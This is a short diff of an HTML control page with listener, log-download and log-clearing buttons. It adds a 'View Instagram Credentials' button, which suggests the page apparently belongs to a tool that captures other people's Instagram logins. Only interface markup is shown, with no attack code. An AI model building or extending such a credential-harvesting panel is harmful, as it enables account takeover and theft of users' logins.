@@ -48,6 +48,7 @@ else {
     <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
     <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
     <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
+    <button class="btn btn-info m-2" id="btn-instagram" onclick=viewInstagramCredentials()>View Instagram Credentials</button>
 </div>
 
 
